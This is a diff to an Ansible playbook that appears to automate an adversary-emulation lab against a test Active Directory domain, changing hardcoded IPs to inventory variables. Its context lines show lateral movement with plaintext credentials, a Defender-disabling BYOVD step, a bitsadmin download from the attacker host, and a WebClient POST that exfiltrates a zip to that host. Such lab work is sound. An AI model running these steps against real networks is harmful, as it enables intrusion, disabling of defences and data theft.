@@ -6,9 +6,9 @@
   vars:
     cap: /home/kali/slopmop-capture
     ts_h: "{{ lookup('pipe', 'date -u +%Y%m%d_%H') }}"
-    suna_dc: 10.1.20.10
-    konoha_dc: 10.1.10.10
-    ws1: 10.1.10.21
+    suna_dc: "{{ hostvars['suna-dc1'].ansible_host }}"
+    konoha_dc: "{{ hostvars['konoha-dc1'].ansible_host }}"
+    ws1: "{{ hostvars['konoha-ws1'].ansible_host }}"
     dcsync_user: svc_adsync
     dcsync_pass: "SyncP@ss2026!"
     suna_domain: sunagakure.wind.ninja
@@ -87,9 +87,9 @@
   gather_facts: false
   vars:
     cap: C:\slopmop-capture
-    kali_ip: 10.1.99.99
-    konoha_dc: 10.1.10.10
-    mail: 10.1.10.20
+    kali_ip: "{{ hostvars['kali'].ansible_host }}"
+    konoha_dc: "{{ hostvars['konoha-dc1'].ansible_host }}"
+    mail: "{{ hostvars['konoha-mail'].ansible_host }}"
     ts_h: "{{ lookup('pipe', 'date -u +%Y%m%d_%H') }}"
   tasks:
     - name: "Deploy step06 — AD discovery and PSRemoting lateral"
@@ -97,7 +97,7 @@
         content: |
           {% raw %}
           $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-          $cap = "C:\slopmop-capture"
+          $cap = "{% endraw %}{{ cap }}{% raw %}"
           $log = "$cap\ad-recon_$ts.log"
           $out = ""
           $out += "=== AD Discovery and Lateral Recon ===`r`n"
@@ -107,7 +107,7 @@
             (ConvertTo-SecureString 'password' -AsPlainText -Force)
           )
 
-          $computers = Invoke-Command -ComputerName 10.1.10.10 `
+          $computers = Invoke-Command -ComputerName {% endraw %}{{ konoha_dc }}{% raw %} `
             -Credential $cred -Authentication Negotiate -ScriptBlock {
             Import-Module ActiveDirectory
             Get-ADComputer -Filter * -Properties OperatingSystem,DNSHostName |
@@ -119,7 +119,7 @@
             $out += "  $($_.Name) - $($_.DNSHostName)`r`n"
           }
 
-          $mailResult = Invoke-Command -ComputerName 10.1.10.20 `
+          $mailResult = Invoke-Command -ComputerName {% endraw %}{{ mail }}{% raw %} `
             -Credential (New-Object PSCredential(
               'FIRE\Administrator',
               (ConvertTo-SecureString 'password' -AsPlainText -Force)
@@ -146,7 +146,7 @@
         content: |
           {% raw %}
           $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-          $cap = "C:\slopmop-capture"
+          $cap = "{% endraw %}{{ cap }}{% raw %}"
           $log = "$cap\defender-kill_$ts.log"
           $out = ""
           $out += "=== Defender Killer: BYOVD via kdysys.dll + msmprun.exe ===`r`n"
@@ -247,7 +247,7 @@
         content: |
           {% raw %}
           $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-          $cap = "C:\slopmop-capture"
+          $cap = "{% endraw %}{{ cap }}{% raw %}"
           $log = "$cap\lolbin-chain_$ts.log"
           $out = ""
           $out += "=== LOLBin Execution Chain ===`r`n"
@@ -265,7 +265,7 @@
           # bitsadmin transfer (T1197)
           $bitsJob = "slopMop_dl_$ts"
           bitsadmin /create $bitsJob 2>&1 | Out-Null
-          $bitsTarget = "http://10.1.99.99:8080/beacon.txt"
+          $bitsTarget = "http://{% endraw %}{{ kali_ip }}{% raw %}:8080/beacon.txt"
           bitsadmin /addfile $bitsJob $bitsTarget "$env:TEMP\bits.txt" 2>&1 | Out-Null
           bitsadmin /resume $bitsJob 2>&1 | Out-Null
           Start-Sleep -Seconds 2
@@ -327,7 +327,7 @@
         content: |
           {% raw %}
           $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-          $cap = "C:\slopmop-capture"
+          $cap = "{% endraw %}{{ cap }}{% raw %}"
           $log = "$cap\dotnet-mem_$ts.log"
           $out = ""
           $out += "=== .NET In-Memory Techniques ===`r`n"
@@ -405,7 +405,7 @@
         content: |
           {% raw %}
           $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
-          $cap = "C:\slopmop-capture"
+          $cap = "{% endraw %}{{ cap }}{% raw %}"
           $log = "$cap\collect-exfil_$ts.log"
           $out = ""
           $out += "=== Collection, Defense Evasion, Exfiltration ===`r`n"
@@ -450,14 +450,14 @@
           try {
             $wc = New-Object System.Net.WebClient
             $wc.UploadData(
-              "http://10.1.99.99:8080/upload", "POST",
+              "http://{% endraw %}{{ kali_ip }}{% raw %}:8080/upload", "POST",
               [IO.File]::ReadAllBytes($zipPath)
             )
-            $out += "[exfil] Sent $zipSize bytes to 10.1.99.99:8080`r`n"
+            $out += "[exfil] Sent $zipSize bytes to {% endraw %}{{ kali_ip }}{% raw %}:8080`r`n"
           } catch {
-            $out += "[exfil] POST to 10.1.99.99:8080 failed: $($_.Exception.Message)`r`n"
+            $out += "[exfil] POST to {% endraw %}{{ kali_ip }}{% raw %}:8080 failed: $($_.Exception.Message)`r`n"
           }
-          $exfilLog = "$($zipPath | Split-Path -Leaf) -> http://10.1.99.99:8080/upload"
+          $exfilLog = "$($zipPath | Split-Path -Leaf) -> http://{% endraw %}{{ kali_ip }}{% raw %}:8080/upload"
           $exfilLog += " ($zipSize bytes) @ $(Get-Date -Format o)"
           $exfilLog | Out-File "$cap\exfil-log_$ts.txt" -Encoding UTF8
           $out += "[exfil] Logged: $exfilLog`r`n"
@@ -476,7 +476,7 @@
     - name: "List WS01 artefacts"
       ansible.windows.win_shell: |
         {% raw %}
-        Get-ChildItem "C:\slopmop-capture" -Recurse |
+        Get-ChildItem "{% endraw %}{{ cap }}{% raw %}" -Recurse |
           Where-Object { -not $_.PSIsContainer } |
           Sort-Object LastWriteTime |
           Format-Table Name,Length,LastWriteTime -AutoSize |
